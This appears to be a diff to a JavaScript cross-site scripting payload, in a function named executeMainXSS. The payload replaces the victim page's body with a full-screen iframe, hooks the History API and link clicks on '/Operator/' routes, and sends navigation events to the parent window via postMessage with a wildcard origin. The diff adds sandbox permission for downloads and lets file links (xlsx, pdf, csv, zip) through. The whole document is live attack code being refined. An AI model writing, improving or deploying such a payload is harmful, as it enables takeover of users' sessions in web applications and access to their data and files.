@@ -45,7 +45,9 @@ function executeMainXSS() {
                 padding: 0 !important;
                 background: white !important;
             `;
+            // ✅ CAMBIO CLAVE: AGREGAR allow-downloads
             iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin allow-popups allow-modals allow-downloads');
+            
             // Limpiar TODO y poner solo el iframe
             document.body.innerHTML = '';
             document.body.style.overflow = 'hidden';
@@ -196,7 +198,7 @@ function executeMainXSS() {
 }
 
 // =============================================
-// IFRAME: SOLO SIMULACIÓN DE RUTAS
+// IFRAME: SOLO SIMULACIÓN DE RUTAS CON MANEJO DE DESCARGAS
 // =============================================
 function setupIframeRouteSimulation() {
     'use strict';
@@ -207,7 +209,7 @@ function setupIframeRouteSimulation() {
     }
     window.__IFRAME_ROUTES_ACTIVE__ = true;
     
-    console.log('Setting up route simulation');
+    console.log('Setting up route simulation with download handling');
     
     // A. INTERCEPTAR HISTORY API
     const originalPushState = history.pushState;
@@ -237,29 +239,45 @@ function setupIframeRouteSimulation() {
         return originalReplaceState.apply(this, arguments);
     };
     
-    // B. INTERCEPTAR CLICKS EN ENLACES
+    // B. INTERCEPTAR CLICKS EN ENLACES - CON MANEJO DE DESCARGAS
     document.addEventListener('click', function(e) {
         let target = e.target;
         while (target && target.tagName !== 'A') {
             target = target.parentElement;
         }
         
-        if (target && target.href && target.href.includes('/Operator/')) {
-            e.preventDefault();
+        if (target && target.href) {
+            // ✅ PERMITIR DESCARGAS - NO hacer preventDefault() para archivos
+            if (target.href.includes('/files/down/') || 
+                target.href.includes('.xlsx') || 
+                target.href.includes('.pdf') ||
+                target.href.includes('.csv') ||
+                target.href.includes('.zip') ||
+                target.download) {
+                
+                console.log('Download allowed:', target.href);
+                // Dejar que la descarga proceda normalmente
+                return;
+            }
             
-            const url = new URL(target.href);
-            const path = url.pathname + url.search;
-            
-            // Navegar dentro del iframe
-            window.location.href = target.href;
-            
-            // Notificar al padre inmediatamente
-            if (window.parent) {
-                window.parent.postMessage({
-                    type: 'URL_CHANGE',
-                    url: path,
-                    action: 'click'
-                }, '*');
+            // Para navegación normal, redirigir dentro del iframe
+            if (target.href.includes('/Operator/')) {
+                e.preventDefault();
+                
+                const url = new URL(target.href);
+                const path = url.pathname + url.search;
+                
+                // Navegar dentro del iframe
+                window.location.href = target.href;
+                
+                // Notificar al padre inmediatamente
+                if (window.parent) {
+                    window.parent.postMessage({
+                        type: 'URL_CHANGE',
+                        url: path,
+                        action: 'click'
+                    }, '*');
+                }
             }
         }
     });
@@ -311,5 +329,5 @@ function setupIframeRouteSimulation() {
         }
     }, 300);
     
-    console.log('simulation active');
+    console.log('simulation active with downloads enabled');
 }
